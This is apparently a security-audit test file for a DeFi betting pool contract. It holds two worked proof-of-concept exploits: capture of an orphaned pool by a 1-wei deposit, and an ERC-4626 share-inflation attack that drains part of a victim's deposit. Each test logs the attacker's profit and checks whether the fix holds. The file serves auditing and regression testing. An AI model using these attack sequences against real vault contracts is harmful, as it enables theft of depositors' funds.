// F-04 — Orphan-pool capture: when totalShares == 0 but pool > 0 (house losses accumulate
//        before any LP / after all LPs exit — the protocol is "pool-zero playable"), the next
//        lpDeposit() mints shares 1:1 with the deposit (`if (totalShares == 0 || pool == 0)
//        shares = amount`), so a 1-wei depositor owns 100% of the accumulated house pool.
// F-05 — ERC-4626 "inflation" attack: no virtual shares/assets. An attacker holding 1 share
//        donates pool value (losing bets) so that a victim's deposit is floored to 1 share and
//        the attacker walks off with ~half of the victim's money.
const { expect } = require("../lib/expect");
const W_ = require("../lib/world");
const { makeWorld, buyTicket, settleHouse, timeTravel, revertOf, U, SET, isFixed } = W_;

describe(`F-04 orphan pool capture [set=${SET}]`, function () {
  this.timeout(600000);

  it("1-wei LP deposit into an orphaned pool withdraws the whole pool after the 7-day lock", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { p1, p5 } = W.signers;
    // no LP exists; players lose 1,000 USDC → pool grows with zero shares outstanding
    const id = await buyTicket(W, p1, 1000, 2);
    await (await settleHouse(W, id, 2)).wait();                  // KNOCKED
    console.log(`  [EVIDENCE] pool after loss = ${await W.house.pool()} (6dp), totalShares = ${await W.house.totalShares()}`);

    const dep = await revertOf(W.house.connect(p5).lpDeposit(1n));  // 1 wei
    console.log(`  [EVIDENCE] attacker lpDeposit(1 wei) → ${dep ?? "OK"}; shares = ${await W.house.lpShares(p5.address)}`);
    if (dep) { expect(isFixed()).to.equal(true); return; }          // fixed: dust rejected, done
    const sh = await W.house.lpShares(p5.address);
    await (await W.house.connect(p5).lpRequestExit(sh)).wait();
    await timeTravel(7 * 86400 + 60);
    const b0 = await W.usdc.balanceOf(p5.address);
    await (await W.house.connect(p5).lpWithdraw()).wait();
    const got = (await W.usdc.balanceOf(p5.address)) - b0;
    console.log(`  [EVIDENCE] attacker paid 1 wei + gas, withdrew ${got} (6dp) = ${Number(got) / 1e6} USDC of player losses`);
    expect(got).gte(U(1000));
  });
});

describe(`F-05 LP share inflation [set=${SET}]`, function () {
  this.timeout(600000);

  it("attacker (1 share) inflates NAV with losing bets; victim's deposit rounds to 1 share", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { p1, p2, p4, p5: attacker, lp } = W.signers;
    const victim = p4;
    // Attacker deposits the minimum: 1 wei → 1 share (first depositor)
    const d0 = await revertOf(W.house.connect(attacker).lpDeposit(1n));
    expect(d0).to.equal(null);
    // Attacker donates ~2,000 USDC of NAV via bets that they LOSE (KNOCKED → pool)
    const donated = U(2000);
    const id = await buyTicket(W, attacker, 2000, 2);
    await (await settleHouse(W, id, 2)).wait();
    // Victim deposits 2,999 USDC: shares = 2999e6 * 1 / 2000e6 = 1 (floor). Expect honest 1:1 accounting.
    const vDep = U(2999);
    const v = await revertOf(W.house.connect(victim).lpDeposit(vDep));
    const sVictim = await W.house.lpShares(victim.address);
    const sAtt = await W.house.lpShares(attacker.address);
    console.log(`  [EVIDENCE] pool after attacker's losing bets = ${await W.house.pool()} (6dp)`);
    console.log(`  [EVIDENCE] victim deposit 2,999 USDC → ${v ?? "OK"}; victim shares=${sVictim}, attacker shares=${sAtt}`);

    // Both exit; compare NAV payouts
    await (await W.house.connect(attacker).lpRequestExit(sAtt)).wait();
    if (v === null) await (await W.house.connect(victim).lpRequestExit(sVictim)).wait();
    await timeTravel(7 * 86400 + 60);
    const ba = await W.usdc.balanceOf(attacker.address);
    await (await W.house.connect(attacker).lpWithdraw()).wait();
    const attGot = (await W.usdc.balanceOf(attacker.address)) - ba;
    let vicGot = 0n;
    if (v === null) {
      const bv = await W.usdc.balanceOf(victim.address);
      await (await W.house.connect(victim).lpWithdraw()).wait();
      vicGot = (await W.usdc.balanceOf(victim.address)) - bv;
    }
    const attCost = donated + 1n;
    console.log(`  [EVIDENCE] attacker cost = 2000 USDC (lost bets) + 1 wei, received = ${Number(attGot) / 1e6} USDC → net ${(Number(attGot) - Number(attCost)) / 1e6} USDC`);
    if (v === null) console.log(`  [EVIDENCE] victim deposited 2999 USDC, received ${Number(vicGot) / 1e6} USDC → net ${(Number(vicGot) - Number(vDep)) / 1e6} USDC`);

    if (!isFixed()) {
      expect(v).to.equal(null);
      expect(attGot).gt(attCost);                 // attacker profits from victim
      expect(vicGot).lt(vDep);                    // victim loses money
    } else {
      expect(attGot).lt(attCost);                 // inflation attack unprofitable
      expect(vicGot).gte(vDep - U(1));            // victim keeps (≈) its deposit
    }
  });
});
